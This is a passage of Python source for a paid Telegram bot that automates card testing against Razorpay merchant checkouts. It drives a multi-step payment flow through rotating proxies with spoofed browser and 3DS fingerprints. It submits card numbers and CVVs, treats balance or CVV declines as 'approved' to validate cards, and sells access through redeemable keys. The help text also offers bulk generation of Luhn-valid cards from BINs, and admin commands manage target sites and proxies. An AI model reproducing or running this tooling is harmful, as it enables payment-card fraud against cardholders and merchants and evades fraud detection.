            "_[shield][os]": "windows", "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome", "_[request_index]": "0",
            "amount": str(int(order_amount)), "order_id": order_id,
            "method": "card", "checkout_id": checkout_id,
        }
        try:
            h6 = {**std_hdrs, "Content-Type": "application/x-www-form-urlencoded"}
            await sess.post(
                f"https://api.razorpay.com/v1/standard_checkout/checkout/order"
                f"?key_id={key_id}&session_token={sessid}&keyless_header={keyless_header}",
                data=form6, headers=h6, proxy=proxy_url,
            )
        except Exception:
            pass

        # ── STEP 7: Cross-border flows (fire & forget) ────────
        try:
            cb_payload = {
                "identifiers": {
                    "merchant": {"country": "IN"},
                    "card":     {"country": "US", "dcc_blacklist": False, "network": brand},
                    "method":   "card",
                    "payment_currency": order_currency,
                },
                "forex_charges": {
                    "amount": order_amount, "currency": order_currency,
                    "filters": {"method": "card"},
                },
            }
            h7 = {**std_hdrs, "Content-Type": "application/json"}
            await sess.post(
                f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows"
                f"?x_entity_id={order_id}&keyless_header={kl_encoded}",
                json=cb_payload, headers=h7, proxy=proxy_url,
            )
        except Exception:
            pass

        # ── STEP 8: Create payment (CORE) ─────────────────────
        sardine_meta = base64.b64encode(
            json.dumps([{"name": "sardine", "metadata": {"session_id": checkout_id}}]).encode()
        ).decode()

        form8 = {
            "user_risk_providers_token": sardine_meta,
            "notes[comment]": "", "notes[email]": email,
            "notes[phone]": phone_short, "notes[name]": "User",
            "payment_link_id": plink, "key_id": key_id,
            "contact": phone, "email": email, "currency": order_currency,
            "_[integration]": "payment_pages",
            "_[checkout_id]": checkout_id,
            "_[device.id]": rzp_device_id, "_[env]": "",
            "_[library]": "checkoutjs", "_[library_src]": "no-src",
            "_[current_script_src]": "no-src", "_[is_magic_script]": "false",
            "_[platform]": "browser", "_[referer]": target_url,
            "_[shield][fhash]": fhash, "_[shield][tz]": "-330",
            "_[device_id]": rzp_device_id, "_[build]": RZP_BUILD,
            "_[shield][os]": "windows", "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome", "_[request_index]": "1",
            "amount": str(int(order_amount)), "order_id": order_id,
            "method": "card",
            "card[number]": cc, "card[cvv]": cvv,
            "card[name]": "User",
            "card[expiry_month]": mm, "card[expiry_year]": str(year_full),
            "save": "0", "dcc_currency": order_currency,
        }
        try:
            async with sess.post(
                f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
                f"?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless_header}",
                data=form8, headers=std_hdrs, proxy=proxy_url,
            ) as r8:
                r8_text = await r8.text(errors="replace")
        except asyncio.TimeoutError:
            return {"status": "error", "message": "Timeout on payment create",
                    "proxy_status": "LIVE"}
        except Exception as ex:
            return {"status": "error", "message": str(ex)[:80],
                    "proxy_status": "LIVE"}

        try:
            r8_data = json.loads(r8_text)
        except Exception:
            return {"status": "error", "message": "Payment create parse failed",
                    "proxy_status": "LIVE"}

        payment_id = _get_str(r8_data, "payment_id") or _get_str(r8_data, "id")

        if not payment_id:
            err_obj  = r8_data.get("error", {}) or {}
            err_desc = _get_str(err_obj, "description")
            err_desc = err_desc.replace(
                " Try another payment method or contact your bank for details.", ""
            ).strip()
            err_code = _get_str(err_obj, "reason")
            label    = f"{err_desc} ({err_code})" if err_code else err_desc
            if not label:
                label = "Unknown decline"
            if _is_balance_keyword(err_desc) or _is_cvv_keyword(err_desc, err_code):
                return {"status": "approved", "message": label, "proxy_status": "LIVE"}
            return {"status": "declined", "message": label, "proxy_status": "LIVE"}

        pid_clean = payment_id.split("_", 1)[1] if "_" in payment_id else payment_id

        # ── STEP 9a: Authenticate (both modes) ───────────────
        try:
            await sess.post(
                f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate",
                data={}, headers={"Content-Type": "application/x-www-form-urlencoded"},
                proxy=proxy_url,
            )
        except Exception:
            pass
        await asyncio.sleep(1)

        # 3DS browser data
        screen = random.choice([[1920,1080],[1366,768],[1536,864],[1440,900]])
        depth  = random.choice([24, 32])
        form_3ds = {
            "browser[java_enabled]":       "false",
            "browser[javascript_enabled]": "true",
            "browser[timezone_offset]":    "0",
            "browser[color_depth]":        str(depth),
            "browser[screen_width]":       str(screen[0]),
            "browser[screen_height]":      str(screen[1]),
            "browser[language]":           "en-US",
            "auth_step":                   "3ds2Auth",
        }
        try:
            await sess.post(
                f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
                data=form_3ds,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                proxy=proxy_url,
            )
        except Exception:
            pass

        # ── STEP 9b: Real charge mode — return charged ────────
        if not cancel_mode:
            return {"status": "charged", "message": "Payment successful",
                    "payment_id": payment_id, "proxy_status": "LIVE"}

        # ── STEP 9c: Auto-hit mode — call cancel to get result ─
        try:
            async with sess.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel"
                f"?key_id={key_id}&session_token={sessid}&keyless_header={keyless_header}",
                headers={
                    "Accept":          "*/*",
                    "Content-type":    "application/x-www-form-urlencoded",
                    "Referer":         rzp_ref,
                    "x-session-token": sessid,
                },
                proxy=proxy_url,
            ) as r9:
                r9_text = await r9.text(errors="replace")
        except asyncio.TimeoutError:
            return {"status": "declined", "message": "Timeout on cancel check",
                    "proxy_status": "LIVE"}
        except Exception as ex:
            return {"status": "declined", "message": str(ex)[:80],
                    "proxy_status": "LIVE"}

        if "razorpay_payment_id" in r9_text:
            return {"status": "charged", "message": "Payment Successful",
                    "payment_id": payment_id, "proxy_status": "LIVE"}

        try:
            r9_data = json.loads(r9_text)
        except Exception:
            return {"status": "declined", "message": "Unknown decline",
                    "proxy_status": "LIVE"}

        err_obj  = r9_data.get("error", {}) or {}
        err_desc = _get_str(err_obj, "description")
        err_desc = err_desc.replace(
            " Try another payment method or contact your bank for details.", ""
        ).strip()
        err_code = _get_str(err_obj, "reason")
        label    = f"{err_desc} ({err_code})" if err_code else err_desc
        if not label:
            label = "Unknown Decline"

        if _is_balance_keyword(err_desc) or _is_cvv_keyword(err_desc, err_code):
            return {"status": "approved", "message": label, "proxy_status": "LIVE"}
        return {"status": "declined", "message": label, "proxy_status": "LIVE"}

# ═══════════════════════════════════════════════════════════════
#                  KEY GENERATION SYSTEM
# ═══════════════════════════════════════════════════════════════

def _gen_key() -> str:
    """Generate key in format RZPX-XXXX-XXXX-XXXX."""
    chars = string.ascii_uppercase + string.digits
    seg   = lambda: "".join(secrets.choice(chars) for _ in range(4))
    return f"RZPX-{seg()}-{seg()}-{seg()}"

async def create_keys(days: int, count: int, created_by: int) -> List[str]:
    """Generate and store keys in Redis."""
    keys = []
    for _ in range(count):
        k = _gen_key()
        await redis.hset(f"bot:keys:{k}", "days",        str(days))
        await redis.hset(f"bot:keys:{k}", "created_at",  str(int(time.time())))
        await redis.hset(f"bot:keys:{k}", "created_by",  str(created_by))
        await redis.hset(f"bot:keys:{k}", "redeemed_by", "")
        await redis.hset(f"bot:keys:{k}", "redeemed_at", "")
        await redis.sadd(RK_KEYS_ACT, k)
        keys.append(k)
    return keys

async def redeem_key(key: str, user_id: int) -> Tuple[bool, str]:
    """Redeem a key for a user. Returns (success, message)."""
    key = key.upper().strip()
    key_data = await redis.hgetall(f"bot:keys:{key}")
    if not key_data:
        return False, "Invalid key. Key not found."
    if key_data.get("redeemed_by"):
        return False, "Key already redeemed."
    if key not in await redis.smembers(RK_KEYS_ACT):
        return False, "Key is no longer active."

    days = int(key_data.get("days", 0))
    if days <= 0:
        return False, "Key has 0 days — invalid."

    now    = time.time()
    expiry = now + (days * 86400)
    plan_name = f"{days}-Day Plan"

    # Update key
    await redis.hset(f"bot:keys:{key}", "redeemed_by", str(user_id))
    await redis.hset(f"bot:keys:{key}", "redeemed_at", str(int(now)))
    await redis.srem(RK_KEYS_ACT, key)

    # Update user plan
    await redis.hset(f"bot:users:{user_id}", "plan",        plan_name)
    await redis.hset(f"bot:users:{user_id}", "plan_expiry", str(expiry))
    await redis.hset(f"bot:users:{user_id}", "plan_name",   plan_name)

    return True, f"Key redeemed! {plan_name} activated until {datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M UTC')}"

async def give_plan(user_id: int, days: int, plan_name: str, given_by: int) -> str:
    """Admin gives a user a plan directly."""
    expiry = time.time() + (days * 86400)
    await redis.hset(f"bot:users:{user_id}", "plan",        plan_name)
    await redis.hset(f"bot:users:{user_id}", "plan_expiry", str(expiry))
    await redis.hset(f"bot:users:{user_id}", "plan_name",   plan_name)
    await redis.hset(f"bot:users:{user_id}", "given_by",    str(given_by))
    return datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M UTC")

async def get_user_role(uid: int) -> str:
    if is_admin(uid):
        return "Owner"
    if await is_sudo(uid):
        return "Sudo"
    if await has_active_plan(uid):
        plan = await redis.hget(f"bot:users:{uid}", "plan_name") or "Premium"
        return plan
    return "Free"

# ═══════════════════════════════════════════════════════════════
#                     UI HELPERS
# ═══════════════════════════════════════════════════════════════

def btn(label: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(label, callback_data=data)

def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn("💳 Generate", "gen_help"),  btn("📦 Split",   "split_help")],
        [btn("📊 Stats",    "cb_stats"),  btn("👤 Profile", "cb_profile")],
        [btn("🔥 Commands", "cb_help"),   btn("ℹ️ Info",    "cb_info")],
    ])

def admin_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [btn("🔥 Test Payment", "menu_test"),  btn("🔗 Sites",   "menu_sites")],
        [btn("📡 Proxies",      "menu_proxy"), btn("🏦 BINs",    "menu_bins")],
        [btn("📊 Stats",        "menu_stats"), btn("👑 Admin",   "menu_admin")],
        [btn("💳 Generate",     "gen_help"),   btn("📦 Split",   "split_help")],
    ])

async def _send_doc(message, bio: BytesIO, part: int, count: int) -> None:
    cap = (
        f"{e('check')} <b>Part {part}</b> — {count:,} cards\n"
        f"  {e('fire')} Luhn-valid {e('sparkle')} Future expiry"
    )
    for attempt in range(2):
        try:
            bio.seek(0)
            await message.reply_document(document=bio, caption=cap,
                                          parse_mode=ParseMode.HTML)
            return
        except Exception as ex:
            logger.error(f"Doc send attempt {attempt+1} failed: {ex}")
            if attempt == 0:
                await asyncio.sleep(1.5)

# ═══════════════════════════════════════════════════════════════
#              /start
# ═══════════════════════════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = update.effective_user.id
    user = update.effective_user

    if await is_banned(uid):
        await update.message.reply_text(
            f"{e('ban')} <b>You are banned</b> from this bot.\n{e('skull')} Contact admin.",
            parse_mode=ParseMode.HTML,
        )
        return

    sites_ct  = await redis.llen(RK_SITES)
    proxy_ct  = await redis.llen(RK_PROXIES)
    bins_ct   = await redis.llen(RK_BINS)
    total_gen = await redis.hget(RK_STATS, "total_generated") or "0"
    total_pay = await redis.hget(RK_STATS, "total_payments")  or "0"
    role      = await get_user_role(uid)
    auth      = await is_authorized(uid)

    role_icon = (
        e("crown")   if is_admin(uid) else
        e("premium") if await is_sudo(uid) else
        e("star")    if auth else
        e("lock")
    )

    text = (
        f"{e('fire')} <b>Razorpay Ultra Bot v5.0</b>\n\n"
        f"{e('wave')} Welcome, <b>{safe(user.first_name)}</b>!\n\n"
        f"{e('stats')} <b>Live Stats</b>\n"
        f"  {e('site')}  Sites   ›› <code>{sites_ct}</code>\n"
        f"  {e('proxy')} Proxies ›› <code>{proxy_ct}</code>\n"
        f"  {e('bin')}   BINs    ›› <code>{bins_ct}</code>\n"
        f"  {e('card')}  Cards   ›› <code>{total_gen}</code>\n"
        f"  {e('money')} Charges ›› <code>{total_pay}</code>\n\n"
        f"{e('key')} Role: {role_icon} <b>{safe(role)}</b>\n"
        f"{e('shield')} Redis: {e('live')} Connected\n\n"
        f"{e('sparkle')} <i>Use /help for commands</i>"
    )

    kb = admin_keyboard() if (is_admin(uid) or await is_sudo(uid)) else main_keyboard()
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)

# ═══════════════════════════════════════════════════════════════
#              /help
# ═══════════════════════════════════════════════════════════════

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if await is_banned(uid):
        return
    if not await is_authorized(uid):
        await update.message.reply_text(
            f"{e('lock')} <b>Access Denied</b>\n\n"
            f"{e('redeem')} Use <code>/redeem KEY</code> to activate a plan.\n"
            f"{e('key')} Contact admin to get a key.",
            parse_mode=ParseMode.HTML,
        )
        return
    text = (
        f"{e('search')} <b>Quick Help</b>\n\n"
        f"{e('card')} <code>/gen BIN amount</code> — Generate cards\n"
        f"  Example: <code>/gen 411111 100</code>\n"
        f"  Pattern: <code>/gen 5xxxxx|12|25|rnd 500</code>\n\n"
        f"{e('mass')} <code>/split N</code> — Split .txt file (reply to file)\n\n"
        f"{e('bin')} <code>/binlookup 411111</code> — BIN info\n\n"
        f"{e('info')} <code>/profile</code> — Your account info\n\n"
        f"{e('redeem')} <code>/redeem KEY</code> — Activate plan with key\n\n"
        f"{e('fire')} <code>/bhosade</code> — Full command list (authorized)\n\n"
        f"{e('star')} Supports Visa, MC, Amex, Discover, Diners, RuPay\n"
        f"{e('check')} 100%% Luhn-valid {e('sparkle')} Future expiry {e('bolt')} Correct CVV"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                     reply_markup=main_keyboard())

# ═══════════════════════════════════════════════════════════════
#              /info
# ═══════════════════════════════════════════════════════════════

async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if await is_banned(uid):
        return
    text = (
        f"{e('info')} <b>Bot Info</b>\n\n"
        f"  {e('fire')}   Version:    <code>v5.0</code>\n"
        f"  {e('tds')}    Redis:      {e('live')} Upstash\n"
        f"  {e('shield')} Proxy:      4 formats supported\n"
        f"  {e('card')}   Cards:      up to <code>{MAX_LIMIT:,}</code>/req\n"
        f"  {e('mass')}   Batch:      <code>{BATCH_SIZE}</code> cards/batch\n"
        f"  {e('clock')}  Rate:       <code>{RATE_LIMIT}</code> req/{RATE_WINDOW}s\n"
        f"  {e('bolt')}   Engine:     <code>PTB v20+ / Python 3.10+</code>\n"
        f"  {e('key')}    Keys:       RZPX-XXXX-XXXX-XXXX format\n"
        f"  {e('plan')}   Plans:      Redeem or admin-assigned\n\n"
        f"{e('rocket')} <b>Real Razorpay flow</b> — 9-step checkout {e('sparkle')}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                     reply_markup=main_keyboard())

# ═══════════════════════════════════════════════════════════════
#              /profile
# ═══════════════════════════════════════════════════════════════

async def cmd_profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid  = update.effective_user.id
    user = update.effective_user
    if await is_banned(uid):
        await update.message.reply_text(
            f"{e('ban')} <b>You are banned.</b>", parse_mode=ParseMode.HTML)
        return

    role      = await get_user_role(uid)
    banned    = await is_banned(uid)
    user_data = await redis.hgetall(f"bot:users:{uid}")
    plan_name = user_data.get("plan_name", "None")
    plan_exp  = user_data.get("plan_expiry", "")

    if plan_exp:
        try:
            exp_dt   = datetime.fromtimestamp(float(plan_exp))
            exp_str  = exp_dt.strftime("%Y-%m-%d %H:%M UTC")
            is_valid = float(plan_exp) > time.time()
            exp_icon = e("live") if is_valid else e("offline")
        except Exception:
            exp_str = "N/A"
            exp_icon = e("offline")
    else:
        exp_str  = "No active plan"
        exp_icon = e("offline")

    role_icon = (
        e("crown")   if is_admin(uid) else
        e("premium") if await is_sudo(uid) else
        e("star")    if await has_active_plan(uid) else
        e("lock")
    )
    username  = f"@{user.username}" if user.username else "N/A"

    text = (
        f"{e('info')} <b>Your Profile</b>\n\n"
        f"{e('wave')}  Name:     <b>{safe(user.first_name)}</b>\n"
        f"{e('search')} Username: <code>{safe(username)}</code>\n"
        f"{e('key')}   ID:       <code>{uid}</code>\n\n"
        f"{e('plan')}  <b>Plan Details</b>\n"
        f"  {role_icon} Role:    <b>{safe(role)}</b>\n"
        f"  {e('redeem')} Plan:  <code>{safe(plan_name)}</code>\n"
        f"  {exp_icon} Expiry:   <code>{exp_str}</code>\n\n"
        f"{e('ban')}   Banned:   <code>{'Yes' if banned else 'No'}</code>\n"
        f"{e('fire')}  Status:   {e('live') if await is_authorized(uid) else e('offline')}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                     reply_markup=main_keyboard())

# ═══════════════════════════════════════════════════════════════
#              /redeem
# ═══════════════════════════════════════════════════════════════

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if await is_banned(uid):
        await update.message.reply_text(
            f"{e('ban')} <b>You are banned.</b>", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('redeem')} <b>Redeem a Key</b>\n\n"
            f"{e('key')} Usage: <code>/redeem RZPX-XXXX-XXXX-XXXX</code>\n\n"
            f"{e('info')} Contact admin to get a key.\n"
            f"{e('star')} Keys activate your plan immediately.",
            parse_mode=ParseMode.HTML,
        )
        return
    key = context.args[0].upper().strip()
    msg = await update.message.reply_text(
        f"{e('loading')} Validating key...", parse_mode=ParseMode.HTML)
    ok, info = await redeem_key(key, uid)
    if ok:
        await msg.edit_text(
            f"{e('success')} <b>Key Redeemed!</b>\n\n"
            f"{e('key')} Key: <code>{safe(key)}</code>\n"
            f"{e('plan')} {safe(info)}\n\n"
            f"{e('fire')} Your plan is now active! {e('sparkle')}",
            parse_mode=ParseMode.HTML,
        )
    else:
        await msg.edit_text(
            f"{e('error')} <b>Redemption Failed</b>\n\n"
            f"{e('cross')} {safe(info)}\n\n"
            f"{e('info')} Contact admin for a valid key.",
            parse_mode=ParseMode.HTML,
        )

# ═══════════════════════════════════════════════════════════════
#         SUDO MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_sudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(
            f"{e('ban')} {e('crown')} Owner-only command.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/sudo &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        await redis.sadd(RK_SUDO, str(target))
        await update.message.reply_text(
            f"{e('check')} User <code>{target}</code> granted {e('premium')} sudo!",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_unsudo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(
            f"{e('ban')} {e('crown')} Owner-only command.", parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/unsudo &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        await redis.srem(RK_SUDO, str(target))
        await update.message.reply_text(
            f"{e('ban')} Sudo revoked from <code>{target}</code>.",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_sudolist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(
            f"{e('ban')} Owner-only.", parse_mode=ParseMode.HTML)
        return
    members = await redis.smembers(RK_SUDO)
    if not members:
        await update.message.reply_text(
            f"{e('info')} No sudo users.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {e('star')} <code>{m}</code>" for m in sorted(members))
    await update.message.reply_text(
        f"{e('crown')} <b>Sudo Users ({len(members)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         BAN MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/ban &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        if target == ADMIN_USER_ID:
            await update.message.reply_text(
                f"{e('error')} Cannot ban the owner.", parse_mode=ParseMode.HTML)
            return
        await redis.sadd(RK_BANNED, str(target))
        await update.message.reply_text(
            f"{e('ban')} User <code>{target}</code> has been banned. {e('skull')}",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_unban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/unban &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target = int(context.args[0])
        await redis.srem(RK_BANNED, str(target))
        await update.message.reply_text(
            f"{e('check')} User <code>{target}</code> unbanned. {e('approved')}",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid user ID.", parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_banlist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    banned = await redis.smembers(RK_BANNED)
    if not banned:
        await update.message.reply_text(
            f"{e('check')} No banned users.", parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {e('ban')} <code>{m}</code>" for m in sorted(banned))
    await update.message.reply_text(
        f"{e('skull')} <b>Banned Users ({len(banned)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         PLAN MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_addplan(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/addplan &lt;user_id&gt; &lt;days&gt; [plan_name]</code>\n"
            f"Example: <code>/addplan 123456 30 Premium</code>",
            parse_mode=ParseMode.HTML)
        return
    try:
        target    = int(context.args[0])
        days      = int(context.args[1])
        plan_name = " ".join(context.args[2:]) if len(context.args) > 2 else "Premium"
        expiry_str = await give_plan(target, days, plan_name, update.effective_user.id)
        await update.message.reply_text(
            f"{e('success')} <b>Plan Assigned</b>\n\n"
            f"  {e('info')} User:   <code>{target}</code>\n"
            f"  {e('plan')} Plan:   <code>{safe(plan_name)}</code>\n"
            f"  {e('clock')} Days:   <code>{days}</code>\n"
            f"  {e('time')} Expiry: <code>{expiry_str}</code>\n\n"
            f"{e('fire')} User now has access! {e('sparkle')}",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid ID or days value.", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         KEY GENERATION  (admin/sudo ONLY)
# ═══════════════════════════════════════════════════════════════

async def cmd_genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if await is_banned(uid):
        return
    # Strictly admin or sudo only
    if not is_admin(uid) and not await is_sudo(uid):
        await update.message.reply_text(
            f"{e('lock')} <b>Access Denied</b>\n\n"
            f"{e('crown')} Only admins and sudo users can generate keys.",
            parse_mode=ParseMode.HTML)
        return
    if not context.args:
        await update.message.reply_text(
            f"{e('key')} Usage: <code>/genkey &lt;days&gt; [count]</code>\n"
            f"Example: <code>/genkey 30</code> or <code>/genkey 7 5</code>\n"
            f"{e('info')} Max 10 keys at once.",
            parse_mode=ParseMode.HTML)
        return
    try:
        days  = int(context.args[0])
        count = int(context.args[1]) if len(context.args) > 1 else 1
        count = max(1, min(count, 10))
        if days <= 0:
            await update.message.reply_text(
                f"{e('error')} Days must be > 0.", parse_mode=ParseMode.HTML)
            return
        msg = await update.message.reply_text(
            f"{e('loading')} Generating {count} key(s)...", parse_mode=ParseMode.HTML)
        keys = await create_keys(days, count, uid)
        key_lines = "\n".join(f"  {e('key')} <code>{k}</code>" for k in keys)
        await msg.edit_text(
            f"{e('success')} <b>{count} Key(s) Generated</b>\n\n"
            f"{key_lines}\n\n"
            f"{e('clock')} Valid for: <code>{days} days</code>\n"
            f"{e('info')} Share with users to activate their plan.\n"
            f"{e('sparkle')} Format: RZPX-XXXX-XXXX-XXXX",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text(
            f"{e('error')} Invalid number.", parse_mode=ParseMode.HTML)

# ═══════════════════════════════════════════════════════════════
#         SITE MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_addsite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/addsite https://example.com/pay</code>",
            parse_mode=ParseMode.HTML)
        return
    url = " ".join(context.args).strip()
    if not url.startswith(("http://", "https://")):
        await update.message.reply_text(
            f"{e('error')} URL must start with <code>http://</code> or <code>https://</code>",
            parse_mode=ParseMode.HTML)
        return
    existing = await redis.lrange(RK_SITES, 0, -1)
    if url in existing:
        await update.message.reply_text(
            f"{e('error')} Site already in list.", parse_mode=ParseMode.HTML)
        return
    msg = await update.message.reply_text(
        f"{e('loading')} Checking site...", parse_mode=ParseMode.HTML)
    proxies   = await redis.lrange(RK_PROXIES, 0, -1)
    proxy_url = get_random_proxy_url(proxies)
    is_live, rzp_key, status_msg = await check_site_live(url, proxy_url)
    await redis.lpush(RK_SITES, url)
    total = await redis.llen(RK_SITES)
    live_icon = e("live") if is_live else e("offline")
    rzp_line  = f"\n{e('key')} Key: <code>{safe(rzp_key)}</code>" if rzp_key else ""
    await msg.edit_text(
        f"{e('check')} <b>Site Added</b>\n\n"
        f"{e('site')} URL: <code>{safe(url)}</code>\n"
        f"{live_icon} Status: <code>{safe(status_msg)}</code>{rzp_line}\n"
        f"{e('stats')} Total: <code>{total}</code>",
        parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_live(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites loaded. Use <code>/addsite</code>.",
            parse_mode=ParseMode.HTML)
        return
    lines = "\n".join(f"  {i}. <code>{safe(s)}</code>" for i, s in enumerate(sites, 1))
    await update.message.reply_text(
        f"{e('fire')} <b>Sites ({len(sites)})</b>\n\n{lines}",
        parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_checksite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites.", parse_mode=ParseMode.HTML)
        return
    proxies   = await redis.lrange(RK_PROXIES, 0, -1)
    proxy_url = get_random_proxy_url(proxies)
    msg = await update.message.reply_text(
        f"{e('loading')} Checking {len(sites)} site(s)...", parse_mode=ParseMode.HTML)
    results = []
    for site in sites:
        is_live, key, status = await check_site_live(site, proxy_url)
        icon    = e("live") if is_live else e("offline")
        key_str = f" {e('key')}<code>{safe(key)}</code>" if key else ""
        results.append(f"  {icon} <code>{safe(site[:55])}</code>{key_str}\n     └ {safe(status)}")
    text = f"{e('search')} <b>Site Check Results</b>\n\n" + "\n\n".join(results)
    await msg.edit_text(text, parse_mode=ParseMode.HTML)

@require_sudo_access
async def cmd_rmsite(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    sites = await redis.lrange(RK_SITES, 0, -1)
    if not sites:
        await update.message.reply_text(
            f"{e('error')} No sites to remove.", parse_mode=ParseMode.HTML)
        return
    if context.args:
        try:
            idx = int(context.args[0]) - 1
            if 0 <= idx < len(sites):
                await redis.lrem(RK_SITES, 1, sites[idx])
                await update.message.reply_text(
                    f"{e('check')} Removed: <code>{safe(sites[idx])}</code>",
                    parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(
                    f"{e('error')} Index out of range.", parse_mode=ParseMode.HTML)
            return
        except ValueError:
            pass
    keyboard = [[btn(f"🗑 {(s[:45]+'…') if len(s)>45 else s}", f"rmsite_{i}")]
                for i, s in enumerate(sites)]
    keyboard.append([btn(f"{e('cross')} Cancel", "cancel")])
    await update.message.reply_text(
        f"{e('tool')} <b>Select site to remove:</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(keyboard))

# ═══════════════════════════════════════════════════════════════
#         PROXY MANAGEMENT
# ═══════════════════════════════════════════════════════════════

@require_sudo_access
async def cmd_addpxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.args:
        await update.message.reply_text(
            f"{e('error')} Usage: <code>/addpxy proxy1 proxy2 …</code>\n\n"
            f"{e('proxy')} <b>Supported formats:</b>\n"
            f"  1️⃣ <code>ip:port</code>\n"
            f"  2️⃣ <code>ip:port:user:pass</code>\n"
            f"  3️⃣ <code>user:pass@ip:port</code>\n"
            f"  4️⃣ <code>socks5://user:pass@ip:port</code>",
            parse_mode=ParseMode.HTML)
        return
    existing = set(await redis.lrange(RK_PROXIES, 0, -1))
    added = skipped = bad = 0
    for raw in context.args:
        info = parse_proxy(raw)
        if not info:
            bad += 1
            continue
        if raw in existing:
            skipped += 1
            continue
        await redis.lpush(RK_PROXIES, raw)
        existing.add(raw)
        added += 1
    total = await redis.llen(RK_PROXIES)
    await update.message.reply_text(
        f"{e('check')} <b>Proxies Added: {added}</b>\n"
        f"  {e('error')} Invalid: <code>{bad}</code>  Dupe: <code>{skipped}</code>\n"
